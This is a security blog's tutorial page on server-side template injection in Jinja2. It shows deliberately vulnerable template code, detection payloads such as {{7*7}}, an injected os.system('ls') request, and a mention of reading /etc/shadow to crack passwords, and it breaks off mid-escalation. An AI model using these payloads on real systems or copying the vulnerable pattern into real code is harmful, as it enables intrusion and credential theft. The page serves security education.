@@ -1,0 +1,404 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Template Injection // 0xSlaxo Blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Abdelrhman Allam" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Template Injection"/>
+<meta name="twitter:description" content="Template engines are a type of software used to determine the appearance of a web page. Developers often overlook attacks that target these engines, called server-side template injections (SSTIs), yet they can lead to severe consequences, like remote code execution.
+References Client Side Template Injection (CSTI)
+Template Injection in Action
+Web Application Penetration Testing Notes
+pentest-guide/Server-Side-Template-Injection at master · Voorivex/pentest-guide
+SSTI (Server Side Template Injection)
+HowToHunt/SSTI.md at master · KathanP19/HowToHunt"/>
+
+    <meta property="og:title" content="Template Injection" />
+<meta property="og:description" content="Template engines are a type of software used to determine the appearance of a web page. Developers often overlook attacks that target these engines, called server-side template injections (SSTIs), yet they can lead to severe consequences, like remote code execution.
+References Client Side Template Injection (CSTI)
+Template Injection in Action
+Web Application Penetration Testing Notes
+pentest-guide/Server-Side-Template-Injection at master · Voorivex/pentest-guide
+SSTI (Server Side Template Injection)
+HowToHunt/SSTI.md at master · KathanP19/HowToHunt" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sl4x0.github.io/web-notes/tempelate-injection/" /><meta property="article:section" content="web-notes" />
+<meta property="article:published_time" content="2022-08-14T23:48:05+00:00" />
+<meta property="article:modified_time" content="2022-08-14T23:48:05+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
+      <h1>0xSlaxo Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p> M.A.C.S Student | N00b CTFer</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.facebook.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>My facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>My Twitter</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Template Injection</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          15 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sl4x0.github.io/tags/ssti/">SSTI</a>
+              <a class="tag" href="https://sl4x0.github.io/tags/web-notes/">Web-Notes</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><em>Template engines</em> are a type of software used to determine the appearance of a web page.  Developers often overlook attacks that target
+these engines, called <em>server-side template injections</em> (SSTIs), yet they can lead to severe consequences, like remote code execution.</p>
+<h1 id="references">References</h1>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti">Client Side Template Injection (CSTI)</a></p>
+<p><a href="https://gosecure.github.io/template-injection-workshop/#0">Template Injection in Action</a></p>
+<p><a href="https://techvomit.net/web-application-penetration-testing-notes/#template-injection">Web Application Penetration Testing Notes</a></p>
+<p><a href="https://github.com/Voorivex/pentest-guide/tree/master/Server-Side-Template-Injection">pentest-guide/Server-Side-Template-Injection at master · Voorivex/pentest-guide</a></p>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI (Server Side Template Injection)</a></p>
+<p><a href="https://github.com/KathanP19/HowToHunt/blob/master/SSTI/SSTI.md">HowToHunt/SSTI.md at master · KathanP19/HowToHunt</a></p>
+<p><a href="https://gowthams.gitbook.io/bughunter-handbook/list-of-vulnerabilities-bugs/ssti">SSTI</a></p>
+<p><a href="https://pentestbook.six2dez.com/enumeration/web/ssti">SSTI</a></p>
+<p><a href="https://portswigger.net/web-security/server-side-template-injection">Server-side template injection | Web Security Academy</a></p>
+<hr>
+<h1 id="mechanisms">Mechanisms</h1>
+<p>Simply put, <em>template engines</em> combine application data with web templates to produce web pages.  These web templates, written in template languages such as <strong>Jinja</strong>, provide developers
+with a way to specify how a page should be rendered. Together, web templates and template engines allow developers to separate <strong>server-side application logic</strong> and <strong>client-side presentation code</strong> during web development.</p>
+<h2 id="template-engines">Template Engines</h2>
+<p>Here is a template file written in Jinja. We will store this file with the name <code>example.jinja</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>body<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span>h1<span style="color:#f92672">&gt;</span>{{ list_title }}<span style="color:#f92672">&lt;/</span>h1<span style="color:#f92672">&gt;</span> <span style="color:#75715e">## template first embeds the expressions list_title and list_description in HTML header tags</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>h2<span style="color:#f92672">&gt;</span>{{ list_description }}<span style="color:#f92672">&lt;/</span>h2<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> item_list <span style="color:#f92672">%</span>} <span style="color:#75715e">## Then it creates a loop to render all items in the item_list variable in the HTML body</span>
+</span></span><span style="display:flex;"><span> {{ item }}
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> loop<span style="color:#f92672">.</span>last <span style="color:#f92672">%</span>},{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/</span>body<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>html<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>In Jinja, any code surrounded by double <strong>curly brackets</strong> {{ }} is to be interpreted as a Python expression, and code surrounded by <strong>bracket and percent</strong> sign pairings {% %} should be interpreted as a Python statement.</p>
+<p>In programming languages, an <em>expression</em> is either a variable or a function that returns a value, whereas a statement is code that doesn’t return anything.</p>
+<p>The following piece of Python code reads the template file from <code>example.jinja</code> and generates an HTML page dynamically by providing the template engine with values to insert into the template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;example.jinja&#39;</span>) <span style="color:#66d9ef">as</span> f: <span style="color:#75715e">## Python code reads the template file named example.jinja</span>
+</span></span><span style="display:flex;"><span> tmpl <span style="color:#f92672">=</span> Template(f<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>print(tmpl<span style="color:#f92672">.</span>render(  <span style="color:#75715e">## generates an HTML page dynamically by providing the template with  the values it needs</span>
+</span></span><span style="display:flex;"><span> list_title <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;Chapter Contents&#34;</span>, <span style="color:#75715e">## rendering the template with the values Chapter Contents as the list_title</span>
+</span></span><span style="display:flex;"><span>	 list_description <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;Here are the contents of chapter 16.&#34;</span>, <span style="color:#75715e">## and Here are the contents of chapter 16. as the list_description</span>
+</span></span><span style="display:flex;"><span> item_list <span style="color:#f92672">=</span>  [<span style="color:#e6db74">&#34;Mechanisms Of Template Injection&#34;</span>, <span style="color:#e6db74">&#34;Preventing Template Injection&#34;</span>, <span style="color:#75715e">## list of values as the item_list</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Hunting For Template Injection&#34;</span>, \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Escalating Template Injection&#34;</span>, <span style="color:#e6db74">&#34;Automating Template Injection&#34;</span>, <span style="color:#e6db74">&#34;Find Your First Template </span>
+</span></span><span style="display:flex;"><span>Injection<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#e6db74">&#34;]</span>
+</span></span><span style="display:flex;"><span>))
+</span></span></code></pre></div><p>The template engine will combine the data provided in the Python script and the template file <code>example.jinja</code> to create this HTML page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">h1</span>&gt;Chapter Contents&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">h2</span>&gt;Here are the contents of chapter 16.&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span> Mechanisms Of Template Injection,
+</span></span><span style="display:flex;"><span> Preventing Template Injection,
+</span></span><span style="display:flex;"><span> Hunting For Template Injection,
+</span></span><span style="display:flex;"><span> Escalating Template Injection,
+</span></span><span style="display:flex;"><span> Automating Template Injection,
+</span></span><span style="display:flex;"><span> Find Your First Template Injection!
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>Template engines make rendering web pages <strong>more efficient</strong>, as developers can present different sets of data in a standardized way by reusing
+templates. This functionality is especially useful <strong>when developers need to generate pages of the same format</strong> with custom content, such as bulk emails,
+individual item pages on an online marketplace, and the profile pages of different users. <strong>Separating</strong> HTML code and application logic also makes it
+easier for developers to <strong>modify and maintain</strong> parts of the HTML code.</p>
+<p>Popular template engines on the market include <em>Jinja</em>, <em>Django</em>, and <em>Mako</em> (which work with Python), <em>Smarty</em> and <em>Twig</em> (which work with PHP), and <em>Apache FreeMarker</em> and <em>Apache Velocity</em> (which work with Java).</p>
+<h2 id="injecting-template-code">Injecting Template Code</h2>
+<p>Template injection vulnerabilities happen when a user is able to inject input into templates without <strong>proper sanitization</strong>.</p>
+<p>Even if the preceding Python snippet does <strong>pass user input into the template</strong> like this, the code would not be vulnerable to template injection because it is safely passing user input into the template as data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;example.jinja&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span> tmpl <span style="color:#f92672">=</span> Template(f<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>print(tmpl<span style="color:#f92672">.</span>render(
+</span></span><span style="display:flex;"><span>	 list_title <span style="color:#f92672">=</span> user_input<span style="color:#f92672">.</span>title, <span style="color:#75715e">## defining that the title portion of the user_input can be used only as the list_title</span>
+</span></span><span style="display:flex;"><span>	  list_description <span style="color:#f92672">=</span> user_input<span style="color:#f92672">.</span>description, <span style="color:#75715e">## the description portion of the user_input is the list_description</span>
+</span></span><span style="display:flex;"><span>		 item_list <span style="color:#f92672">=</span> user_input<span style="color:#f92672">.</span>list, <span style="color:#75715e">## list portion of the user_input can be used for the item_list of the template</span>
+</span></span><span style="display:flex;"><span>))
+</span></span></code></pre></div><p>Here’s an example. The following program takes user input and inserts it into a Jinja template to display the user’s name on an HTML page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span>tmpl <span style="color:#f92672">=</span> Template(<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: &#34; + user_input + &#34;&lt;/h1&gt;&lt;/html&gt;&#34;) ## code first creates a template by concatenating HTML code and user input together</span>
+</span></span><span style="display:flex;"><span>print(tmpl<span style="color:#f92672">.</span>render()) <span style="color:#75715e">## renders the template</span>
+</span></span></code></pre></div><p>If users submit a GET request to that page, the website will return an HTML page that displays their name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span>Vickie
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p>This request will cause the template engine to render the following page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: Vickie&lt;/h1&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>html<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Now, what if you submitted a payload like the following instead?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span>{{<span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>}}
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p><code>Jinja2</code> interprets anything within double curly brackets {{ }} as <strong>Python code</strong>. You will notice something odd in the resulting HTML page.</p>
+<p>Instead of displaying the string The user&rsquo;s name is: <code>{{1+1}}</code>, the page displays the string The user&rsquo;s name is: 2:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: 2&lt;/h1&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>html<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>For instance, upper() is a method in Python that converts a string to uppercase. Try submitting the code snippet <code>{{'Vickie'.upper()}}</code>, like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span>{{<span style="color:#e6db74">&#39;Vickie&#39;</span><span style="color:#f92672">.</span>upper()}}
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p>You should see an HTML page like this returned:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: VICKIE&lt;/h1&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>html<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Depending on the permissions of the compromised application, attackers might be able to use the template injection vulnerability to <strong>read sensitive files or escalate their privileges on the system</strong>.</p>
+<hr>
+<h1 id="prevention">Prevention</h1>
+<ul>
+<li>The first way is by regularly patching and updating the frameworks and template libraries your application uses.</li>
+<li>You should also prevent users from supplying <code>user-submitted</code> templates if possible.</li>
+</ul>
+<p>If that isn’t an option, many template engines provide a <em>hardened sandbox environment</em> that you can use to safely handle user input.</p>
+<ul>
+<li>Implement an <strong>allowlist</strong> for allowed attributes in templates to prevent the kind of RCE exploit</li>
+<li>You should handle these <strong>errors</strong> properly and return a generic error page to the user.</li>
+<li>Finally, <strong>sanitize</strong> user input before embedding it into web templates and avoid injecting user-supplied data into templates whenever possible.</li>
+</ul>
+<hr>
+<h1 id="hunting-for-template-injection">Hunting for Template Injection</h1>
+<p>The first step in finding template injections is to identify locations in an application that <em>accept user input</em>.</p>
+<h2 id="step-1-look-for-user-input-locations">Step 1: Look for User-Input Locations</h2>
+<p>These include URL paths, <strong>parameters</strong>, <strong>fragments</strong>, <strong>HTTP request headers and body</strong>, <strong>file uploads</strong>, and more.
+For example, applications often use template engines to generate customized email or home pages based on the user’s information.</p>
+<p>So to look for template injections, look for endpoints that <strong>accept user input</strong> that will eventually be displayed back to the user.</p>
+<h2 id="step-2-detect-template-injection-by-submitting-test-payloads">Step 2: Detect Template Injection by Submitting Test Payloads</h2>
+<p>This test string should contain <strong>special characters</strong> commonly used in template languages. I like to use the string <code>{{1+abcxx}}${1+abcxx}&lt;%1+abcxx%&gt;[abcxx]</code> because it’s designed
+to induce errors in popular template engines. <code>${...}</code> is the special syntax for expressions in the <em>FreeMarker</em> and <em>Thymeleaf</em> Java templates; <code>{{...}}</code> is the
+syntax for expressions in PHP templates such as <em>Smarty</em> or <em>Twig</em>, and Python templates like Jinja2; and <code>&lt;%= ... %&gt;</code> is the syntax for the <em>Embedded Ruby template</em> (ERB).</p>
+<p>In this payload, I make the template engine resolve the variable with the name <code>abcxx</code>, which probably has not been defined in the application. If
+you get an application error from this payload, that’s a good indication of  template injection, because it means that the special characters are being treated as special by the template engine.</p>
+<p>Try providing these test payloads to the input fields <code>${7*7}</code>, <code>{{7*7}}</code>, and <code>&lt;%= 7*7 %&gt;</code>. These payloads are designed to detect template injection in various templating languages. <code>${7*7}</code> works for the FreeMarker and Thymeleaf
+Java templates; <code>{{7*7}}</code> works for PHP templates such as Smarty or Twig, and Python templates like Jinja2; and <code>&lt;%= 7*7 %&gt;</code> works for the ERB template.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}}
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p>If you’re targeting one of these endpoints, you’ll need to look out for signs that your payload has succeeded. For example, if an application renders an input field
+unsafely when generating a bulk email, you will need to look at the generated email to check whether your attack has succeeded.
+The three test payloads <code>${7*7}, {{7*7}}, and &lt;%= 7*7 %&gt;</code> would work when user input is inserted into the template as plaintext, as in this code snippet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span>tmpl <span style="color:#f92672">=</span> Template(<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: &#34; + user_input + &#34;&lt;/h1&gt;&lt;/html&gt;&#34;)print(tmpl.render())</span>
+</span></span></code></pre></div><p>But what if the user input is <strong>concatenated</strong> into the template as a part of the template’s logic, as in this code snippet?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span>tmpl <span style="color:#f92672">=</span> Template(<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: {{&#34; + user_input + &#34;}}&lt;/h1&gt;&lt;/html&gt;&#34;)print(tmpl.render())</span>
+</span></span></code></pre></div><p>In that case, the best way to detect whether your input is being interpreted as code is to submit a random
+expression and see if it gets interpreted as an expression. In this case, you can input 7*7 to the field and see if 49 gets returned:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><h2 id="step-3-determine-the-template-engine-in-use">Step 3: Determine the Template Engine in Use</h2>
+<p>If your payload caused an error, the <strong>error message</strong> itself may contain the name of the template engine. For example, submitting my test string
+<code>{{1+abcxx}}${1+abcxx}&lt;%1+abcxx%&gt;[abcxx]</code> to our example Python application would cause a descriptive error that tells me that the application is using Jinja2:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>jinja2<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>UndefinedError: <span style="color:#e6db74">&#39;abcxx&#39;</span> <span style="color:#f92672">is</span> undefined
+</span></span></code></pre></div><p>For example, if you submit <code>&lt;%= 7*7 %&gt;</code> as the payload and 49 gets returned, the application probably uses the ERB template. If the successful payload is <code>${7*7},</code> the template
+engine could either be Smarty or Mako. If the successful payload is <code>{{7*7}}</code>, the application is likely using Jinja2 or Twig.</p>
+<hr>
+<h1 id="escalating-the-attack">Escalating the Attack</h1>
+<p>Your method of escalating the attack will depend on the template engine you’re targeting. To learn more about it, read the <strong>official documentation of
+the template engine</strong> and the accompanying programming language. Here, I’ll show how you can escalate a template injection vulnerability to achieve
+system command execution in an application running Jinja2.</p>
+<p>For example, if an attacker can execute arbitrary system commands on a Linux machine, they can read the system’s password file by executing the</p>
+<p>command <code>cat /etc/shadow</code>. They can then use a password-cracking tool to crack the system admin’s encrypted password and gain access to the admin’s account.</p>
+<h2 id="searching-for-system-access-via-python-code">Searching for System Access via Python Code</h2>
+<p>How do you go on to execute system commands by injecting Python code?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span>tmpl <span style="color:#f92672">=</span> Template(<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;&lt;</span>h1<span style="color:#f92672">&gt;</span>The user<span style="color:#e6db74">&#39;s name is: &#34; + user_input + &#34;&lt;/h1&gt;&lt;/html&gt;&#34;)print(tmpl.render())</span>
+</span></span></code></pre></div><p>Normally in Python, you can execute system commands via the <code>os.system()</code> function from the OS module ⇒ <code>os.system('ls')</code>
+However, if you submit this payload to our example application, you most likely won’t get the results you expect:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>display_name<span style="color:#960050;background-color:#1e0010">?</span>name<span style="color:#f92672">=</span>{{os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ls&#39;</span>)}}
+</span></span><span style="display:flex;"><span>Host: example<span style="color:#f92672">.</span>com
+</span></span></code></pre></div><p>Instead, you’ll probably run into an application error: <code>jinja2.exceptions.UndefinedError: 'os' is undefined</code></p>
+<p>This is because the OS module isn’t recognized in the template’s environment. By default, it doesn’t contain dangerous modules like OS . Normally,
+you can import Python modules by using the syntax import MODULE, or from MODULE import *, or finally <strong>import</strong>(&lsquo;MODULE&rsquo;). Let’s try to import the os module:</p>
